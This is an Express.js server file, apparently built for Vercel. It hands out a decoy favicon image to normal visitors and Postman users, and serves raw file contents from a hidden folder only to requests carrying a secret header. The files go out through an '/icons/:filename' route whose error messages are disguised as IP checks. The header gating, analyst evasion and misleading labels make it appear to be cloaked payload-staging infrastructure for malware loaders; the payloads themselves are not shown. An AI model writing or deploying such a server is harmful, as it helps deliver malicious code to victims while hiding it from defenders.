const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const rateLimit = require("express-rate-limit");
const axios = require("axios"); // To call external API for IP details
const requestIp = require("request-ip"); // To extract client's IP address

const SECRET_HEADER_VALUE = "logo";

const app = express();
const port = process.env.PORT || 4000;

app.set("trust proxy", true);

// Path to the "15" folder
const folderPath = path.join(__dirname, "15");

// Enable CORS for all requests
app.use(cors());

// Rate Limiter Middleware to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 1000, // Limit each IP to 100 requests per window
  standardHeaders: true,
  legacyHeaders: false,
  message: "Too many requests, please try again later.",

  // Skip rate limiting if the secret header is valid
  skip: (req) => req.headers["bearrtoken"] === SECRET_HEADER_VALUE,
});

// Apply rate limiter globally
// app.use(limiter);

// Middleware to extract client's IP
app.use(requestIp.mw());

// Middleware to parse JSON requests
app.use(express.json());

app.use(express.static("public"));

// Middleware to log requests into Firebase Firestore
app.use(async (req, res, next) => {
  const secretHeader = req.headers["bearrtoken"];
  const clientIp = req.clientIp; // Extract the IP address
  const requestUrl = req.originalUrl;
  const requestMethod = req.method; // Capture the HTTP method
  const userAgent = req.headers["user-agent"] || "";
  const isPostman = userAgent.toLowerCase().includes("postman") || req.headers["postman-token"];

  try {
    if (requestUrl === "/mine/list" || requestUrl === "/mine/delete") {
      next();
      return;
    }
    if (isPostman || secretHeader !== SECRET_HEADER_VALUE) {
      const imagePath = path.join(__dirname, 'public', 'favicon.png'); // Adjust image name as needed
      return res.sendFile(imagePath);
      // return res.json({
      //   ipInfo: ipDetails,
      // });
    }
  } catch (err) {
    return res.status(403).json({
      error: "err"
    });
  }
  next();
});

// Dynamic Route: Return file contents based on the filename in the "15" folder
app.get("/icons/:filename", (req, res) => {
  const requestedFile = req.params.filename;
  const filePath = path.join(folderPath, requestedFile);

  // Check if the file exists
  fs.access(filePath, fs.constants.F_OK, (err) => {
    if (err) {
      return res.status(404).json({ error: "IP check failed." });
    }

    // Read the file content
    fs.readFile(filePath, "utf-8", (err, content) => {
      if (err) {
        return res.status(500).json({ error: "Unable to check IP." });
      }
      res.json(content);
    });
  });
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});

// Export for Vercel
module.exports = app;
